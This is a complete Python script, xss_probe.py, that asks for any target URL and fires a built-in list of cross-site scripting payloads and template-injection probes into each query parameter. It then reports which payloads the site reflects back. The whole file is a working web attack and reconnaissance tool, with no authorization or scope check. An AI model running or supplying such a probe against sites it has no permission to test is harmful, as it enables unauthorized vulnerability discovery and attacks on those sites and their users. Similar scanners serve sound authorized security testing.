# language: Python 3, file: xss_probe.py, target: Windows/Linux
# XSS probe — injects XSS payloads into URL params and checks reflection.
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TIMEOUT = 10
PAYLOADS = [
    '<script>alert(1)</script>',
    '"<script>alert(1)</script>',
    "'<script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

def test_param(base, params, pname):
    for payload in PAYLOADS:
        p = dict(params)
        p[pname] = payload
        url = base + '?' + urlencode(p)
        try:
            r = requests.get(url, timeout=TIMEOUT)
            if payload in r.text or payload.lower() in r.text.lower():
                print(f"[REFLECTED] param='{pname}' payload='{payload}'")
        except Exception as e:
            print(f"[ERR] {e}")

def main():
    url = input("Target URL with params (ex: http://site.com/search?q=test): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    base = urlunparse(parsed._replace(query=''))
    if not params:
        print("[!] No parameters in URL.")
        sys.exit(1)
    flat = {k: v[0] for k, v in params.items()}
    print(f"[*] Testing {len(flat)} param(s): {list(flat.keys())}\n")
    for pname in flat:
        test_param(base, flat, pname)
    print("[+] Done.")

if __name__ == "__main__":
    main()
